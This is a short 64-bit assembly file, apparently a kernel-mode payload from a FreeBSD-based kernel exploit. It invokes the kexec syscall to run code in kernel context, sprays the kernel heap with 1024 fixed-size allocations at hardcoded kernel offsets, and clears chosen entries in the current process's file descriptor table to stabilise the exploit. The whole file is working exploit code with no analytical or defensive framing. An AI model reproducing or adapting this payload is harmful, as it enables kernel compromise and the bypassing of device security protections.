use64 ; 64-bit Assembly Code


entry:
  push rsi                    ; Preserve rsi register
  push rdi                    ; Preserve rdi register
  mov rsi, rsp                ; Load stack pointer into rsi
  lea rdi, [rel kernel_entry] ; Load address of kernel_entry label into rdi
  mov eax, 11                 ; Set syscall number (11 = kexec)
  syscall                     ; Invoke syscall
  pop rdi                     ; Restore rdi
  pop rsi                     ; Restore rsi
  ret                         ; Return
kernel_entry:
  mov rsi, [rsi+8]    ; Load value at rsi+8 into rsi (kernel_base)
  push qword [rsi]    ; Push (socket closeup) address
  push qword [rsi+8]  ; Push (kernel base) address
  mov rcx, 1024
.malloc_loop:
  push rcx
  mov rax, [rsp+8] ; kernel base
  mov edi, 0xf8 ; sz
  lea rsi, [rax+0x1540eb0] ; M_TEMP
  mov edx, 2
  add rax, 0xd7a0 ; malloc
  call rax
  pop rcx
  loop .malloc_loop
  pop rdi
  pop rsi
  test rsi, rsi
  jz .skip_closeup
  mov rax, [gs:0]     ; thread - Kernel runnable context (thread)?
  mov rax, [rax+8]    ; td_proc (struct proc* td_proc)      - Associated process
  mov rax, [rax+0x48] ; p_fd (struct filedesc* p_fd)        - Open files
  mov rdx, [rax]      ; fd_ofiles (struct file** fd_ofiles) - File structures for open files.
  mov rcx, 512
.closeup_loop:
  lodsd                     ; Load next file descriptor index
  mov qword [rdx+8*rax], 0  ; Set corresponding entry in file descriptor table to zero
  loop .closeup_loop        ; Loop until rcx is zero
.skip_closeup:
  xor eax, eax              ; Clear eax (return value)
  ret                       ; Return to caller
align 8
